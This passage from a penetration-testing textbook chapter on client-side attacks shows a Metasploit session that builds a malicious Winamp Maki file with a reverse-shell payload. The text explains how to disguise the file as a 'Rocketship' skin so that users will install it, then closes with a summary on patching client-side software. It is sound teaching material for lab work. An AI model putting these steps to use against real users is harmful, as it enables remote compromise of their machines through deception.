Winamp exploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/windows/fileformat/winamp_maki_bof</strong></span>&#13;
msf  exploit(winamp_maki_bof) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/fileformat/winamp_maki_bof):&#13;
&#13;
   Name  Current Setting  Required  Description&#13;
   ----  ---------------  --------  -----------&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Winamp 5.55 / Windows XP SP3 / Windows 7 SP1&#13;
&#13;
&#13;
msf  exploit(winamp_maki_bof) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(winamp_maki_bof) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(winamp_maki_bof) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Creating 'mcvcore.maki' file ...&#13;
[+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki</pre></div></div><p>Choose a compatible Windows payload as shown. Once the malicious Maki file has been generated, copy it to the Apache web server directory, and set up a payload handler. (An example of setting up the handler is included in <a class="xref" href="ch10.xhtml#serving_the_malicious_pdf_and_using_a_ha" title="Example 10-11. Serving the malicious PDF and using a handler">Example 10-11</a>.) Now we need to package this malicious file in such a way that a user may be convinced to load it in Winamp. We can create a new Winamp skin by copying one of the skins packaged with Winamp. We can replace the <span class="emphasis"><em>mcvcore.maki</em></span> file from our example skin with our malicious one. It doesn’t matter what our skin actually looks like, because it will cause Winamp to hang and send us our session in Metasploit.</p><p><a class="indexterm" id="iddle2165"/>In Windows 7, make a copy of the default Bento Winamp skin folder from <span class="emphasis"><em>C:\Program Files\Winamp\Skins</em></span> and copy it to Kali. Rename the folder <span class="emphasis"><em>Bento</em></span> to <span class="emphasis"><em>Rocketship</em></span>. Replace the file <span class="emphasis"><em>Rocketship\scripts\mcvcore.maki</em></span> with the malicious file we just created in Metasploit. Zip the folder and copy it to the web server. In the next chapter we will look at methods of creating believable social-engineering campaigns, but suffice it to say, if we can convince users that this malicious skin will make their Winamp look like a rocket ship, we might be able to convince users to install it.</p><p>Switch to Windows 7, download the zipped skin from the Kali web server, unzip it, and save the folder to <span class="emphasis"><em>C:\Program Files\Winamp\Skins</em></span> as shown in <a class="xref" href="ch10.xhtml#installing_the_malicious_winamp_skin" title="Figure 10-3. Installing the malicious Winamp skin">Figure 10-3</a>.</p><div class="figure"><a id="installing_the_malicious_winamp_skin"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00105"/><img alt="Installing the malicious Winamp skin" src="httpatomoreillycomsourcenostarchimages2030400.png.jpg"/></div></div><div class="figure-title">Figure 10-3. Installing the malicious Winamp skin</div></div><p>Now open Winamp, go to <span class="strong"><strong>Options</strong></span> ▸ <span class="strong"><strong>Skins</strong></span>, and choose <span class="strong"><strong>Rocketship</strong></span>, as shown in <a class="xref" href="ch10.xhtml#using_the_malicious_skin" title="Figure 10-4. Using the malicious skin">Figure 10-4</a>.</p><p>Once you select the malicious skin, Winamp will appear to close, and you will receive a session in your Metasploit handler.</p><div class="figure"><a id="using_the_malicious_skin"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00106"/><img alt="Using the malicious skin" src="httpatomoreillycomsourcenostarchimages2030402.png.jpg"/></div></div><div class="figure-title">Figure 10-4. Using the malicious skin</div></div></div></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00028" style="clear: both">Summary</h2></div></div></div><p><a class="indexterm" id="iddle2549"/>The attacks we’ve seen in this chapter target software that is not listening on a network port. We attacked browsers, PDF viewers, the Java browser plugin, and a music player. We generated malicious files that trigger a vulnerability in the client-side software when opened by the user, and we looked at examples that ask the user for permission to run malicious code instead of relying on an unpatched vulnerability.</p><p>The Internet can be a scary place for client-side software. Some of the exploits discussed in this chapter were seen in the wild before a patch was issued by the vendors. In fact, the Java exploit we used in <a class="xref" href="ch10.xhtml#java_vulnerability" title="Java Vulnerability">Java Vulnerability</a> was still a zero-day vulnerability when the Metasploit module was added to the framework. Anyone using Java 7 could run afoul of a malicious site, even if his or her machine was fully patched, and all an attacker had to do was use Metasploit to perform a successful attack.</p><p>Of course, disabling or uninstalling Java fixes this problem in the event of a zero-day exploit running rampant on the Internet, but that might not be feasible for all users and organizations. Though not all sites use Java, popular online meeting software such as WebEx and GoToMeeting require Java, and the virtual classroom software Blackboard has Java components as <a class="indexterm" id="iddle1114"/><a class="indexterm" id="iddle1450"/><a class="indexterm" id="iddle2448"/>well. A lot of network/security appliances actually require network/security admins to run outdated versions of Java, which makes them perfect targets for client-side attacks. Most readers can probably think of at least one site that complains if Java is not installed.</p><p>Client-side software is necessary to perform day-to-day tasks in any organization, but this software should not be overlooked when evaluating security risks. Keeping all client-side software up-to-date with the latest patches can be a daunting task on your personal computer, much less on the computers of an entire organization. Even organizations that are doing a good job of applying important Windows security fixes may miss an update to Java or Adobe Reader and leave company workstations open to client-side attacks.</p><p>All of the attacks in this chapter depend on a legitimate user taking action on the target systems. Although we’ve seen what can happen when users are tricked into opening malicious files, we’ve yet to look at the tricks used to make people open those files. In the next chapter we’ll study social engineering—that is, ways of tricking users into performing harmful actions such as opening a malicious file, entering credentials into an attacker-owned site, or giving out sensitive information over the phone.</p></div></section></body></html>